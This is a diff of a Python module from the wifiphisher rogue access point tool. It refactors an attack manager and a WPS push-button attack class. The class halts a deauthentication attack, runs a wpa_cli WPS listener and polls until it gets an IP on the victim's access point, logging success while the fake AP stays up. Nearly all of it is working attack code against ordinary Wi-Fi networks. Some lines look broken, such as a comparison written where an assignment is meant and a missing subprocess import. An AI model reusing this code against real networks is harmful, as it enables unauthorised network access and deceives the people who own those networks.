@@ -1,8 +1,6 @@
 from wifiphisher.common.constants import *
 import time, threading, socket, fcntl, struct, json
 
-class Load(object):
-    pass
 
 class Manage(object):
 
@@ -32,56 +30,60 @@ class Manage(object):
     def check(self):
 
         """
-        Check which attack has been chosen
+        Check which attack has been chosen, if the attack
+        is not valid raise NotValidAttack()
         """
 
         if not self.attack in self.attacks :
             raise NotValidAttack(self.attack, self.attacks)
-            #with open(self.log_file, "a+") as log_file:
-            #    log_file.write('[' + T + '*' + W + '] ' + R + "ATTACK ACTIVATED : " +
-            #                   G + self.attack)
-            #    log_file.close()
-            #if self.attack == "wps_pbc":
-            #    wps = WPS_PBC(self.log_file)
 
     def provide(self):
 
+        """
+        Returns what is needed for the attack to run
 
+        :param self: A Manage object
+        :type self: Manage
+        :return: what is needed for the attack to run
+        :rtype: list
+        """
 
-class AttackAlreadyRunning(Exception):
+        self.needs = "all"
+        if self.attack == "wps_pbc":
+            #pay attention to this order when you create an attack because this is the
+            #the order that you're gonna recieve as parameter in your attack.
+            #see WPS_PBC as example
+            self.needs = ["deauth-object", "deauth_iface", "target_bssid"]
 
-    """
-    Exception class to raise if an attack is already running
-    """
+        return self.needs
 
-    def __init__(self):
+    def run(self, needs):
 
-        message = ("An attack is currently running, you can't have"
-                    "more than one attack running at the same time!\n")
+        """
+        This function start the attack passing as parameter
+        what it got from pywifiphisher, if some parameter that
+        are necessary for the attack to run are empty, None, or False
+        raise the exception : DidNotProvide()
+        If you are creating an attack make sure that your object has
+        a start() function!
+        """
 
-        Exception.__init__(self, message)
+        self.recv_needs = needs #Needs recieved from pywifiphisher
+        for need in self.recv_needs : #Check if they're valid
+            if not need or need == "" or need is None :
+                raise DidNotProvide(self.needs, self.recv_needs)
 
-class NotValidAttack(Exception):
+        self.attack_name = self.attack
+        if self.attack_name == "wps_pbc":
+            self.attack == WPS_PBC(self.needs, self.log_file)
 
-    """
-    Exception class to raise if the attack selected doesn't exitst.
-    """
-
-    def __init__(self, attack, attacks):
-
-        self.attack = attack
-        self.attacks = attacks
-        message = ("The attack : "+self.attack+" isn't valid, check if the template\n"
-                    "you are using is passing the right parameter via post request"
-                    "the current attacks available are : \n"+str(self.attacks)+"\n"
-                    "Make sure that in your post request after 'attack-mode=' you have "
-                    "a valid attack")
-
-        Exception.__init__(self, message)
-
+        with open(self.log_file, "a+") as log_file: #Writing a log
+            log_file.write('[' + T + '*' + W + '] ' + R + "ATTACK ACTIVATED : " +
+                           G + self.attack_name)
+        self.attack.start() #Start the attack
 
 class WPS_PBC(object):
-    def __init__(self, log_file):
+    def __init__(self, needs, log_file):
 
         """
         Setup the class with all the given arguments.
@@ -95,12 +97,11 @@ class WPS_PBC(object):
         Taking self.bssid, self.iface and self.deauth from Load()
         """
 
-        self.bssid, self.iface, self.deauth = give
+        self.deauth, self.iface, self.bssid = needs[0], needs[1], needs[2]
         self.conf_dir = "/etc/wpa_supplicant.conf"
         self.log_file = log_file
-        self.core()  #start the attack
 
-    def core(self):
+    def start(self):
 
         """
         This is the core of the attack
@@ -140,25 +141,21 @@ class WPS_PBC(object):
         waiting for more than 2 mins.
         ( routers provide the wps_pbc function for max 2 mins )
         """
-        with open(self.log_file, "a+") as log_file:
-            log_file.write('[' + T + '*' + W + '] ' + R + "listener started")
-            log_file.close()
+
         self.stop_deauth() #Stopping the deauth
         time.sleep(7) #give some time to the AP to come back
 
-        self.tm = threading.Thread(target=self.timer)
+        self.tm = threading.Thread(target=self.check_if_connected)
         cli = subprocess.Popen(self.wpa_cli, shell=True, stdout=subprocess.PIPE, \
                                 stdin=subprocess.PIPE, stderr=subprocess.PIPE) #start the wps listener
-        self.tm.start() #start the timer
+        self.tm.start() #start checking if we are connected
 
     def stop_deauth(self):
 
         """
         Stop deauthenticating
         """
-        with open(self.log_file, "a+") as log_file:
-            log_file.write('[' + T + '*' + W + '] ' + R + "deauth stopped")
-            log_file.close()
+
         self.deauth.stop_deauthentication()
 
     def deauth_rest(self):
@@ -177,33 +174,51 @@ class WPS_PBC(object):
 
         subprocess.call(["sudo ifconfig "+self.iface+" up"], shell=True)
 
-    def timer(self):
+    def check_if_connected(self):
 
         """
-        This timer counts how many seconds passed
-        from the start point, it checks if it's been more
-        than two mins and if we are connected to the
-        victim's AP.
-        If it's been 2 mins or more stop everything.
+        This function will keep checking if we
+        are successfully connected to the target AP
         """
-        with open(self.log_file, "a+") as log_file:
-            log_file.write('[' + T + '*' + W + '] ' + R + "timer started")
-            log_file.close()
-        secs = 0
-        while secs < 120 : #while it's been less than 2mins
+
+        while 1:
             ip = self.check_ip() #check if we got an ip from the AP
             if not ip:
                 time.sleep(1)
-                secs += 1.2
             else :
-                self.done() #if we did we're done
-        self.stop() #it's been more than 2mins
+                self.done()
+
+    #def timer(self):
+
+    #    """
+    #    This timer counts how many seconds passed
+    #    from the start point, it checks if it's been more
+    #    than two mins and if we are connected to the
+    #    victim's AP.
+    #    If it's been 2 mins or more stop everything.
+    #    """
+
+    #    secs = 0
+    #    while secs < 120 : #while it's been less than 2mins
+    #        ip = self.check_ip() #check if we got an ip from the AP
+    #        if not ip:
+    #            time.sleep(1)
+    #            secs += 1.2
+    #        else :
+    #            self.done() #if we did we're done
+    #    self.stop() #it's been more than 2mins
 
 
     def check_ip(self):
 
         """
-        Check if we got an ip from the vitcim's AP
+        Returns the ip that we got or a False if
+        we are not connected to the target AP
+
+        :param self: A WPS_PBC object
+        :type self: WPS_PBC
+        :return: False or the ip we got
+        :rtype: bool or string
         """
 
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -225,6 +240,21 @@ class WPS_PBC(object):
                     return False
         return ip #return the ip we got
 
+
+
+    def done(self):
+
+        """
+        This function will prompt a log to the user,
+        set the self.going to False to terminate the attack
+        """
+        
+        with open(self.log_file, "a+") as log_file:
+            log_file.write('[' + T + '*' + W + '] ' + G + "The WPS button has been pressed :" +
+                           Y + "You are now connected to "+self.bssid+" the fake AP is still running\n"+
+                           "but the deauthentication attack and the WPS_PBC attack are not running anymore")
+        self.going = False
+
     def stop(self):
 
         """
@@ -234,8 +264,38 @@ class WPS_PBC(object):
         This restart the deauthentication process and change
         the variable self.going to stop the attack.
         """
-        with open(self.log_file, "a+") as log_file:
-            log_file.write('[' + T + '*' + W + '] ' + R + "stopped")
-            log_file.close()
+
         self.deauth_rest()
         self.going = False
+
+
+class AttackAlreadyRunning(Exception):
+
+    """
+    Exception class to raise if an attack is already running
+    """
+
+    def __init__(self):
+
+        message = ("An attack is currently running, you can't have"
+                    "more than one attack running at the same time!\n")
+
+        Exception.__init__(self, message)
+
+class NotValidAttack(Exception):
+
+    """
+    Exception class to raise if the attack selected doesn't exitst.
+    """
+
+    def __init__(self, attack, attacks):
+
+        self.attack = attack
+        self.attacks = attacks
+        message = ("The attack : "+self.attack+" isn't valid, check if the template\n"
+                    "you are using is passing the right parameter via post request"
+                    "the current attacks available are : \n"+str(self.attacks)+"\n"
+                    "Make sure that in your post request after 'attack-mode=' you have "
+                    "a valid attack")
+
+        Exception.__init__(self, message)
